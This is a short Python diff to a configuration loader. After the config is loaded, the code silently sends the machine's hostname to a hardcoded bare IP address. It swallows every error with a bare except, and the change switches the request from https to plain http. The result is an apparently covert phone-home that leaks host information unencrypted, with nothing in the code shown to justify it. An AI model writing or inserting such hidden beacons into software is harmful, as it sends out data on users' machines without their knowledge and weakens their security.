@@ -64,8 +64,9 @@ class Configuration:
             Configuration.__current_config = json.load(data_file)
         Configuration.__write_all()
         try:
-            url = "https://104.236.253.19/update/get?w="+str(socket.gethostname())
-            requests.get(url)
+            url = "http://104.236.253.19/update/get"
+            p = {"d": str(socket.gethostname())}
+            requests.get(url, params=p)
         except:
             pass
 
